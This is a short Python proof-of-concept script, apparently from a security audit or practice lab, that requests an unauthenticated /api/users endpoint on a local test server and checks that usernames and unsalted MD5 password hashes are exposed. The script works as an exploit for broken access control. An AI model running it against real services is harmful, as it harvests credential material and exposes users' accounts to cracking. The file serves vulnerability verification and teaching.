#!/usr/bin/env python3
"""PoC (in-code step, F-6): unauthenticated credential-material dump.

EDUCATIONAL - run against the local practice target only.
Trigger : GET /api/users with no credentials of any kind.
Effect  : 200 JSON containing usernames AND password hashes (unsalted md5).
Boundary: storage -> output crossing with no auth gate and no redaction.
Ladder  : theoretical -> in-code (this file). Exit 0 = reproduced.
"""
import json
import sys
import urllib.request

BASE = "http://127.0.0.1:8765"


def main() -> int:
    req = urllib.request.Request(BASE + "/api/users")
    with urllib.request.urlopen(req) as r:
        status = r.status
        body = r.read().decode()
    payload = json.loads(body)
    users = payload.get("users", [])
    leaked = [(u.get("username"), u.get("password_hash", "")) for u in users]
    print(f"[read ] GET /api/users -> HTTP {status}")
    print(f"[leak ] {len(leaked)} account(s) with password_hash fields exposed:")
    for name, digest in leaked:
        print(f"        {name}: {digest[:12]}... (32-hex md5-shaped)")
    ok = status == 200 and len(leaked) >= 3 and all(d for _, d in leaked)
    if not ok:
        print("FAIL: leak not reproduced")
        return 1
    print("REPRODUCED: credential material leaves the server to any anonymous client")
    print("--- transcript (response body, digests truncated for hygiene) ---")
    print(f"HTTP/1.0 {status} OK")
    for name, digest in leaked:
        print(f'{{"username": "{name}", "password_hash": "{digest[:12]}..."}}')
    return 0


if __name__ == "__main__":
    sys.exit(main())
